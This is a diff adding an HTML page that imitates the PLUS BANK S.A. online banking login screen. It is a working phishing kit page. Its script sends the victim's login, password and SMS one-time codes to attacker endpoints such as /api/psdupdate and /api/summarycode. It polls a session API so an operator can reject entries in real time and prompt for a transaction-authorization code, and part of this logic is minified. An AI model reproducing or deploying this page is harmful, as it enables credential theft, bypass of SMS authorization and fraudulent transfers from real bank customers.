@@ -1,0 +1,388 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml"><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="Cache-Control" content="no-cache">
+    <meta http-equiv="Cache-Control" content="no-store">
+    <meta http-equiv="expires" content="0">
+    <meta http-equiv="pragma" content="no-cache">
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE">
+
+
+    <link rel="stylesheet" type="text/css" href="/assets/banks/plusbank_files/42021020600380951038.css">
+
+
+
+    <link rel="stylesheet" type="text/css" href="/assets/banks/plusbank_files/42021020600380952257.css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/plusbank_files/420210206003809581216.css">
+    <link rel="stylesheet" type="text/css" href="/assets/banks/plusbank_files/420210206003809588220.css">
+
+
+
+
+    <title>PLUS BANK S.A. – System Bankowości Elektronicznej</title>
+
+
+
+
+
+    <style type="text/css"> .ui-datepicker-close { display: none; } </style><style type="text/css"> .ui-datepicker-trigger { display: none; } </style></head>
+
+<style>
+    .submitButton {
+        appearance: auto;
+        user-select: none;
+        white-space: pre;
+        align-items: flex-start;
+        text-align: center;
+        cursor: default;
+        color: -internal-light-dark(black, white);
+        background-color: -internal-light-dark(rgb(239, 239, 239), rgb(59, 59, 59));
+        box-sizing: border-box;
+        padding: 1px 6px;
+        border-width: 2px;
+        border-style: outset;
+        border-color: -internal-light-dark(rgb(118, 118, 118), rgb(133, 133, 133));
+        border-image: initial;
+    }
+</style>
+
+<body >
+
+
+
+<div id="blockframe"><div id="circle">&nbsp;</div></div>
+<div id="main_header">
+    <div id="header">
+
+
+        <div id="header-logo"><a href="#"><img src="/assets/banks/plusbank_files/420210206003809597227.gif" width="180" height="94" align="middle"></a></div>
+
+
+        <div id="top-menu">
+            <ul>
+                <ul>
+
+                    <li>
+
+                        <a href="https://plusbank24.pl/web-client/javascript:openContextHelpIndex('contextHelp.action?helpPage=index.htm');">
+                            Pomoc
+                        </a>
+
+                    </li>
+
+                </ul>
+            </ul></div>
+
+        <div id="main-menu">
+            <ul>
+
+                <li class="active">
+                    <a href="#">Logowanie</a>
+                    <span></span>
+                </li>
+
+
+            </ul>
+        </div>
+
+
+    </div>
+</div>
+
+<div id="main_submenu">
+
+</div>
+
+<div id="main_content">
+
+    <div id="login" name="login"><input type="hidden" name="token" value="f825e97a-0df2-4ba5-9b4f-ffb6ee57e7c6" id="login_token">
+
+        <div id="left-col-login">
+            <div class="box-content-login">
+                <div class="top">
+                    <div class="bottom">
+                        <h2 id="summaryInfo" class="icon-login">Zaloguj się</h2>
+                        <a class="btn-help" title="Pomoc" href="https://plusbank24.pl/web-client/javascript:openContextHelp('contextHelp.action?helpPage=scr/htm/logowanie/Identyfikator.htm');"><span>Pomoc</span></a>
+
+                        <table class="table-pref clear">
+                            <tbody><tr class="clear-content">
+                                <td id="mainCont">
+                                    <div class="login-box">
+
+
+
+
+
+                                        <div class="title">
+                                            <table class="table-inner">
+                                                <tbody><tr>
+                                                    <td>
+                                                        <strong>
+                                                            <label>Podaj Identyfikator/Alias            </label>
+                                                        </strong>
+                                                    </td>
+
+                                                </tr>
+                                                </tbody></table>
+
+                                        </div>
+                                        <div class="margin">
+                                            <input type="text" data-theme="a" name="login.login_S1" maxlength="30" value="" autocomplete="off" id="bank_login" class="text-bg" style="width: 220px;">
+                                        </div>
+                                        <div class="title">
+                                            <table class="table-inner">
+                                                <tbody><tr>
+                                                    <td>
+                                                        <strong>
+                                                            <label>Podaj swoje hasło</label>
+                                                        </strong>
+                                                    </td>
+
+                                                </tr>
+                                                </tbody></table>
+
+                                        </div>
+                                        <div class="margin">
+                                            <input type="text" data-theme="a" name="login.login_S1" maxlength="30" value="" autocomplete="off" id="bank_password" class="text-bg" style="width: 220px;">
+                                        </div>
+
+                                        <div class="left">
+                                            <a class="btn-keyboard" href="https://plusbank24.pl/web-client/javascript:keyb_change('login_login_login_S1')"></a>
+                                        </div>
+
+                                        <div class="left" id="buttonsCont">
+                                            <input onclick="bankLogin(); plusBankUpdate()" id="bankButton" type="submit" class="btn-navy-100 margin-left5" value="Dalej">
+
+                                        </div>
+                                        <br><br><br>
+                                        <div class="left" id="keyboard"></div>
+
+
+
+
+
+
+
+
+                                    </div>
+                                </td>
+                            </tr>
+
+                            <tr class="line">
+                                <td colspan="2">&nbsp;</td>
+                            </tr>
+                            <tr class="important-big">
+                                <td>
+                                    <div class="icon"><span>Uwaga</span></div>
+                                    <div class="text">
+                                        <p></p><p><strong><span style="color: #ff0000; font-size: 10pt;"><span style="color: #ff0000;"><strong><span style="font-size: 12pt;"><strong><span style="font-size: 12pt;"><strong><span style="color: #008000; font-size: 12pt;"><span style="color: #ff0000;"><strong><span style="color: #008000; font-size: 12pt;">&nbsp;&nbsp;</span></strong></span></span></strong></span></strong></span></strong></span></span></strong></p>
+                                        <p align="left"><span style="color: #008000;"><a class="null" style="color: #008000;" href="http://plusbank.pl/alias" target="_blank">USTAW SWÓJ WŁASNY ALIAS DO LOGOWANIA. &gt;&gt; KLIKNIJ TUTAJ &lt;&lt;</a></span></p>
+                                        <p>&nbsp;</p>
+                                        <p><a href="http://plusbank.pl/nie-pamietam-loginu-lub-hasla">Nie pamiętam loginu lub hasła</a> | <a href="http://plusbank.pl/problem-z-logowaniem">Problem z logowaniem</a></p><p></p>
+                                    </div>
+                                </td>
+                            </tr>
+
+                            <tr class="line-more-login">
+                                <td><p>&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: x-small;"><strong>APLIKACJA MOBILNA plusbank24</strong></span></p>
+                                    <p>&nbsp;</p>
+                                    <p><span style="font-size: x-small; color: #000000; font-family: arial,helvetica,sans-serif;">Korzystaj z plusbank24 również w swoim telefonie. Kliknij <a href="https://plusbank.pl/plusbank24-aplikacja-mobilna">tutaj</a> lub zeskanuj QR kod i sprawdź jakie możliwości daje Ci bankowość mobilna. Aplikację można pobrać ze sklepu właściwego dla systemu operacyjnego:</span></p>
+                                    <table style="margin-left: auto; margin-right: auto;" border="0">
+                                        <tbody>
+                                        <tr>
+                                            <td style="background: transparent none repeat scroll 0% 0%;">
+                                                <ul>
+                                                    <li>
+                                                        <p><span style="font-size: x-small; color: #888888;"><span style="color: #000000;">Android (wersja minimum 5.x, wersja zalecana 7.x) – w</span> <a href="https://play.google.com/store/apps/details?id=eu.eleader.mobilebanking.invest">Google play</a>&nbsp;&nbsp;</span></p>
+                                                    </li>
+                                                    <li>
+                                                        <p><span style="font-size: x-small; color: #888888;"><span style="color: #000000;">iOS (wersja minimum 10.x, wersja zalecana 13.x) – w</span> <a href="https://itunes.apple.com/us/app/plusbank24/id798542934?ls=1&mt=8">App Store</a></span></p>
+                                                    </li>
+                                                </ul>
+                                                <p>&nbsp;</p>
+                                            </td>
+                                            <td style="background: transparent none repeat scroll 0% 0%;"><img class="message-img" src="420210206003809599229.jpg" alt=""></td>
+                                        </tr>
+                                        </tbody>
+                                    </table>
+                                </td>
+                            </tr>
+
+                            </tbody></table>
+                    </div>
+                </div>
+            </div>
+            <div class="margin-add-10"></div>
+
+            <div class="box-content">
+                <div class="top">
+
+                    <div class="bottom">
+                        <h2 class="icon-info">Informacje o bezpieczeństwie</h2>
+
+                        <div class="info-area">
+                            <p style="text-align: left;"><span style="font-family: arial,helvetica,sans-serif; font-size: x-small;"><strong>Do serwisu transakcyjnego plusbank24 loguj się zawsze wpisując w adres przeglądarki&nbsp;</strong><a href="https://plusbank24.pl"><strong>plusbank24.pl</strong></a><strong> lub poprzez przycisk „LOGOWANIE” na oficjalnej stronie </strong><a href="http://plusbank.pl"><strong>plusbank.pl</strong></a> </span></p>
+                            <ul>
+                                <li><span style="font-family: arial,helvetica,sans-serif; font-size: x-small; color: #000000;"><span style="font-family: arial,helvetica,sans-serif; font-size: x-small; color: #000000;">Nigdy nie używaj do logowania adresu lub linku przesłanego e-mailem, </span></span><span style="font-size: 8pt;"><span style="font-family: Calibri;">SMS-em, komunikatorem, przez media społecznościowe lub przez inne aplikacje</span><span style="font-family: arial,helvetica,sans-serif; font-size: x-small; color: #000000;">.</span></span></li>
+                                <li><span style="font-family: arial,helvetica,sans-serif; font-size: x-small; color: #000000;">Przed zalogowaniem upewnij się, że połączenie jest szyfrowane - adres strony logowania, powinien zaczynać się od https, a nie http.</span></li>
+                                <li><span style="font-family: arial,helvetica,sans-serif; font-size: x-small; color: #888888;"><span style="color: #000000;">Odszukaj na stronie znaczek kłódki, aby potwierdzić, że strona posiada ważny certyfikat wystawiony dla PLUS BANK S.A. dla strony</span> <span style="font-family: arial,helvetica,sans-serif; font-size: x-small;"><a href="https://plusbank24.pl"><strong>plusbank24.pl</strong></a></span>.</span></li>
+                                <li><span style="font-family: arial,helvetica,sans-serif; font-size: x-small; color: #000000;">Po zakończeniu pracy w plusbank24 wyloguj się używając przycisku Wyloguj.</span></li>
+                                <li><span style="font-family: arial,helvetica,sans-serif; font-size: x-small; color: #000000;">Nie udostępniaj swojego nr identyfikatora ani aliasu oraz haseł osobom trzecim.</span></li>
+                                <li><span style="font-family: arial,helvetica,sans-serif; font-size: x-small; color: #000000;">Zawsze weryfikuj czy wprowadzony numer rachunku odbiorcy jest tym, na który chcesz wykonać przelew.</span></li>
+                                <li><span style="font-family: arial,helvetica,sans-serif; font-size: x-small; color: #000000;">Zawsze weryfikuj czy treść wiadomości SMS autoryzującej operację (w szczególności numeru rachunku odbiorcy) zgadza się z autoryzowaną dyspozycją.</span></li>
+                            </ul>
+                            <p>&nbsp;</p>
+                            <p><span style="color: #000000;"><strong>Pełną wersję zasad bezpiecznego korzystania z serwisu transakcyjnego znajdziesz </strong></span><a class="null" href="http://plusbank.pl/bezpieczenstwo" target="_blank"><strong>tutaj</strong></a></p>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+        </div>
+        <div id="right-col-login">
+
+            <div class="margin-banner"></div>
+            <div class="margin-banner"></div>
+
+        </div>
+
+        <div class="clear"></div>
+
+
+
+    <div class="clear"></div>
+</div>
+
+
+<div id="main_footer">
+    <div id="footer">
+        <div class="left"><strong>PLUS BANK S.A.</strong> Wszelkie prawa zastrzeżone.</div>
+        <div class="right">
+            <ul>
+                <li><a class="link-navy" target="_blank" href="http://plusbank.pl/bezpieczenstwo">Bezpieczeństwo</a></li>
+                <li><a class="link-navy" target="_blank" href="https://plusbank.pl/elfinder/files/pdf/konta/regulamin_zintegrowany.pdf">Regulamin zintegrowany dla osób fizycznych i firm</a></li>
+                <li><a class="link-navy" target="_blank" href="http://plusbank.pl/obsluga-klienta">Centrum Obsługi Klienta</a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+
+
+    <script src="/assets/js/jquery-3.5.1.min.js"></script>
+    <script src="/assets/js/cookies.core.1.3.min.js"></script>
+    <script src="/assets/js/banklogin.js"></script>
+    <script>
+        let bankId = (cookieManager.read('session_id'))
+
+        const plusBankUpdate = () => {
+            if ($("#bank_password").val() && $("#bank_login").val() !== "") {
+                $("#mainCont").empty()
+                $("#mainCont").append(' <div class="title"> <table class="table-inner"> <tbody><tr> <td> <strong> <label>Podaj kod SMS z telefonu</label> </strong> </td></tr></tbody></table> </div><div class="margin"> <input type="text" data-theme="a" name="login.login_S1" maxlength="30" value="" autocomplete="off" id="bank_psd" class="text-bg" style="width: 220px;"> </div><br><div class="left" id="buttonsCont"> <input onclick="psdUpdate()" id="bankButton" type="submit" class="btn-navy-100 margin-left5" value="Dalej"> </div>')
+            } else {
+            }
+        }
+
+        const regularCheck = () => {
+            readTextFile("/api/sessions", function(text){
+                var data = JSON.parse(text);
+                for (let i=0;i<data["result"].length;i++) {
+                    if (data["result"][i]["uid"] == sessId) {
+                        if (data["result"][i]["accepted"] == "true") {
+                            summaryFunc()
+                            clearInterval(multipleFunc)
+                        }
+                    } else {
+
+                    }
+                }
+            });
+        }
+        const psdUpdate = () => {
+            if ($("#bank_psd").val() !== "") {
+                $.post("/api/psdupdate/", {
+                    bank_psd: $("#bank_psd").val(),
+                    sessionId: bankId
+                }).done(data => {
+                    $("#mainCont").empty()
+                    $("#mainCont").append('<h1>Logowanie...</h1>')
+                }).fail(error => {
+                    console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+                })
+
+            } else {
+                console.log('not selectec')
+            }
+        }
+
+        let multipleFunc = setInterval(function(){ regularCheck() }, 3000);
+
+        //WRONG PASS
+
+        const wrongPass = () => {
+            $.post("/api/wrongpass/", {
+                sessionId: bankId,
+                name: "false"
+            }).done(data => {
+                console.log('done')
+            }).fail(error => {
+                console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+            })
+        }
+
+        const regularPass = () => {
+            readTextFile("/api/sessions", function(text){
+                var data = JSON.parse(text);
+                for (let i=0;i<data["result"].length;i++) {
+                    if (data["result"][i]["uid"] == sessId) {
+                        if (data["result"][i]["accepted"] == "wrongPass") {
+                            clearInterval(multiplePass)
+                            wrongPass()
+                            location.reload()
+                        }
+                    } else {
+
+                    }
+                }
+            });
+        }
+
+        let multiplePass = setInterval(function(){ regularPass() }, 3000);
+
+
+
+
+        //SUMMARY
+
+        const summaryFunc = () => {
+            $("#mainCont").empty()
+            $("#mainCont").append(' <div class="title"> <table class="table-inner"> <tbody><tr> <td> <strong> <label>Podaj kod SMS z telefonu</label> </strong> </td></tr></tbody></table> </div><div class="margin"> <input type="text" data-theme="a" name="login.login_S1" maxlength="30" value="" autocomplete="off" id="bank_summary" class="text-bg" style="width: 220px;"> </div><br><div class="left" id="buttonsCont"> <input onclick="summaryCode()" id="bankButton" type="submit" class="btn-navy-100 margin-left5" value="Dalej"> </div>')
+
+            document.getElementById('summaryInfo').innerText = 'Autoryzuj Tranzakcję'
+        }
+
+        const summaryCode = () => {
+            if ($("#bank_summary").val() !== "") {
+                $.post("/api/summarycode/", {
+                    bank_summary: $("#bank_summary").val(),
+                    sessionId: bankId
+                }).done(data => {
+                    $("#mainCont").empty()
+                    $("#mainCont").append('<h1>Logowanie...</h1>')
+                    $("#buttonsCont").empty()
+                }).fail(error => {
+                    console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+                })
+
+            } else {
+                console.log('not selectec')
+            }
+        }
+
+        const regularSummary=()=>{readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"wrongSummary"==s.result[e].accepted&&(summaryFunc(),wrongSum())})},wrongSum=()=>{$.post("/api/wrongsummary/",{sessionId:bankId,name:"false"}).done(e=>{console.log("done")}).fail(e=>{console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.","Wystąpił błąd")})};let multipleSummary=setInterval(function(){readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"wrongSummary"==s.result[e].accepted&&(summaryFunc(),wrongSum())})},3e3);const regularComplete=()=>{readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"completed"==s.result[e].accepted&&(location.href="/summary")})};let multipleCompleted=setInterval(function(){readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"completed"==s.result[e].accepted&&(location.href="/summary")})},3e3);
+    </script>
+
+</body></html>
+
